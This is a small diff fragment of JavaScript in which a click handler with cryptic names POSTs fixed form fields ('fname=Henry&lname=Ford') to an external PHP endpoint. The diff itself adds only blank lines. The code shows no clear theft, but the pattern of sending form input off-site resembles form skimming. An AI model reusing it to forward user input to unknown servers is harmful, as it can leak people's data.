@@ -325,9 +325,12 @@ document.querySelector(".u23bt1").onclick = () => {
     }
 
 
+
+
     xtget.open("POST", "http://node.operate.su/12.php", true);
     xtget.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xtget.send("fname=Henry&lname=Ford");
+
 
 
 
